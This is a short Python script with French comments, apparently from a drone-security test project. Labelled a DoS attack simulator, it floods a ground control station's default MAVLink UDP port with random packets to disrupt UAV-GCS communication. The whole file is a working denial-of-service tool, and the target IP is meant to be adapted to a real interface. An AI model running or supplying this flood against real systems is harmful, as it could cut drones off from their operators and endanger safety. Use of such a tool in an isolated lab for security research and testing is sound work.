"""
Denial-of-Service (DoS) Attack Simulator
----------------------------------------
Ce script envoie massivement des paquets UDP vers une IP cible (ex: station de contrôle)
pour saturer le réseau et perturber la communication UAV-GCS.
"""

import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from utils.logger import setup_logger
from utils.config import GPS_BASE_LAT, GPS_BASE_LON, SIMULATED_GPS_POINTS, GPS_SPOOF_FREQ

import socket
import random
import time
from utils.logger import setup_logger

logger = setup_logger()
logger.info("Début de l'attaque DoS UDP...")

TARGET_IP = "192.168.0.100"  # à adapter selon l'interface réelle
TARGET_PORT = 14550  # port MAVLink par défaut
PACKET_SIZE = 1024
DURATION = 15  # en secondes

def perform_dos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + DURATION
    sent_packets = 0

    while time.time() < timeout:
        data = random._urandom(PACKET_SIZE)
        sock.sendto(data, (TARGET_IP, TARGET_PORT))
        sent_packets += 1
        logger.info(f"Paquet DoS #{sent_packets} envoyé à {TARGET_IP}:{TARGET_PORT}")
        time.sleep(0.05)

    logger.info(f"Fin de l’attaque DoS : {sent_packets} paquets envoyés.")

if __name__ == "__main__":
    perform_dos()